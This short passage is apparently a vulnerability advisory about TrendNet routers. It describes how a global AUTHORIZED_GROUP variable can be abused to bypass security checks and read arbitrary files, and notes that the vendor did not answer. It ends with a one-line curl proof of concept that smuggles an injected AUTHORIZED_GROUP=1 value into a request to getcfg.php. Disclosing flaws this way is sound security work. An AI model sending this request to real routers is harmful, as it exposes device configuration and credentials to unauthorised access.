Beyond Security’s SecuriTeam Secure Disclosure program.

Vendor response
Several attempts to email TrendNet went unanswered, we have no idea what is
the status of a fix or availability of a workaround.

Vulnerability details
When an Admin is log-in to one of the mentioned TrendNet routers – it will
trigger the global variable: $AUTHORIZED_GROUP >= 1.

An attacker can use this global variable to bypass security checks and use
it to read arbitrary files.

Proof of Concept
$ curl -d "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1" "http://
[IP]/getcfg.php"
